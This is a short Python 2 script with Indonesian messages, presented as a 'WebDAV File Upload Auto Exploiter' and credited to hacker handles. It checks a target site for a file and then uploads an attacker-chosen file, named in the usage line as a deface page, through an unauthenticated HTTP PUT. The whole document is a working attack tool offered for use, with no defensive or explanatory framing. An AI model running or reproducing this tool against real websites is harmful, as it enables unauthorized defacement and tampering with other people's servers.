#!/usr/bin/python

import requests
import string
import random
import sys
import os

os.system("clear")

print """
 Webdav Please Wait!! 
 
_____________________________________________



[*] Target Ada Di PATH 
[*] Auto Exploit 
[*] Terima Kasih Telah Menggunakan Tools Ini :) 

 
____________________________________________ """

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Upload Nama Filelu : %s") % (sys.argv[2])
  print("[*] Uploading %d bytes, Script Baru") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Upload Gagal . . .")
    sys.exit(1)
  else:
    print("[+] File Sedang Di Upload Please Wait . . .")
    print("[+] PATH : "+host + nama)


def cekfile():
 print("""
~| WebDAV File Upload Auto Exploiter
~| Coded To Python By ./HanubyHell
~| Thx To Baby Cyber Mafia For PHP Exploit
~| Thanks MXZ For Special Coder And
~| Thanks Mr.ZtrocxK

____________________________________________
""")
 print("[*] Cek File Di Target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] Ada File Lain Mau Di Tiban? . . .")
  tanya = raw_input("[!] Pindahkan  File Target ? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print("[!] Upload Gagal . . .")
   sys.exit()
 else:
   print("[*] File Ga Di Target . . .")
   print("[*] Proses Upload Script lu . . .")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Usage: "+sys.argv[0]+" Target.com ScriptDeface.htm\n")
    sys.exit(0)
  else:
    cekfile()